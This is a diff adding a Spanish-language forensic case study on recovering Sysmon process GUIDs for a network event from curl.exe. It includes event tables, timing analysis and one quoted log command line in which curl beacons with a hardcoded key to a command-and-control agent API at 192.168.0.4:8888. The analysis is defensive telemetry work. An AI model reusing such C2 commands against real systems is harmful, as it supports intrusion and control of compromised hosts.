@@ -812,4 +812,86 @@ $$
 
 $g_0$ es el GUID correcto para el evento centinela.
 
+## Caso de estudio — Evento 31: PID 10096, `theblock.boombox.local`
+
+**Datos del evento centinela $e^*$:**
+
+| Campo | Valor |
+|-------|-------|
+| Fila CSV | 285721 |
+| EventID | 3 (NetworkConnect) |
+| `Image` | `<unknown process>` |
+| `SourceIp` | 10.1.0.5 |
+| `SourcePort` | 50863 |
+| `DestinationIp` | 192.168.0.4 |
+| `DestinationPort` | 8888 (C2) |
+| `ts` ($t^*$) | 2025-03-19 05:55:55.509 UTC |
+
+**Resultado de $\mathcal{G}(10096,\, \texttt{theblock})$:**
+
+$$
+\mathcal{G}_1 = \{g_0\}, \quad \mathcal{G}_2 = \emptyset, \quad
+\mathcal{G}_3 = \emptyset, \quad \mathcal{G}_4 = \{g_0\}
+\quad \Rightarrow \quad \lvert\mathcal{G}\rvert = 1
+$$
+
+donde $g_0 =$ `4a85d404-5c6b-67da-4702-000000005500` (`curl.exe`).
+
+**Ciclo de vida $\mathcal{L}(g_0)$:**
+
+$$
+\lvert\mathcal{L}(g_0)\rvert = 21 \text{ eventos}
+\quad (k_1 = 18,\; k_4 = 3)
+\quad \text{span} = 238\,\text{ms}
+$$
+
+| k-pair | EID | Cantidad | Interpretación |
+|--------|-----|----------|----------------|
+| k1 | 1 | 1 | EID=1 ProcessCreate ($t_{\min}$, +0 ms) |
+| k1 | 7 | 16 | DLLs cargadas con $g_0$ asignado |
+| k1 | 5 | 1 | EID=5 ProcessTerminate (+238 ms) |
+| k4 | 10 | 3 | Accesos al proceso `curl.exe` |
+
+**Verificación temporal:**
+
+$$
+t_{\min}(g_0) = \texttt{05:55:55.594} \qquad t^* = \texttt{05:55:55.509}
+\qquad t_{\max}(g_0) = \texttt{05:55:55.832}
+$$
+
+Gap = **-85 ms** — el mayor observado hasta ahora. `curl.exe` establece la
+conexión TCP hacia el C2 antes de que Sysmon complete la asignación del GUID,
+adelantándose 85 ms a $t_{\min}(g_0)$.
+
+```{figure} img/ev31_timeline.png
+:name: ev31-timeline
+:width: 100%
+
+**Evento 31 — PRE_GUID_INIT en `curl.exe` (PID 10096, `theblock`).**
+Panel superior: ciclo de vida de $g_0$ (21 eventos, span = 238 ms).
+Puntos azules (k1): proceso activo. Triángulos naranja (k4): accesos EID=10.
+Línea roja discontinua: centinela $t^*$ a -85 ms. Línea verde: EID=1 ($t_{\min}$). Línea rojo oscuro: EID=5.
+Panel inferior (zoom -90 a +15 ms): brecha PRE_GUID_INIT de 85 ms.
+```
+
+**Contexto APT:** la `CommandLine` del EID=1 revela tráfico C2:
+
+```
+curl -s -H "KEY:ADMIN123" -H "Content-Type: application/json"
+     -X PATCH http://192.168.0.4:8888/api/v2/agents/muoevz -d '{"watchdog":1}'
+```
+
+El agente malicioso actualiza su estado en el servidor de control.
+No existe ningún EID=3 con $g_0$ real — la recuperación proviene exclusivamente
+de $k_1$ (EID=1, EID=7, EID=5), confirmando la robustez de la condición $|\mathcal{G}|=1$.
+
+**Aplicación de la regla de recuperación:**
+
+$$
+t^* < t_{\min}(g_0) \quad (\delta = -85\,\text{ms})
+\;\implies\; \texttt{REPLACE\_GUID} \quad [\texttt{PRE\_GUID\_INIT}]
+$$
+
+$g_0$ es el GUID correcto para el evento centinela.
+
 ---
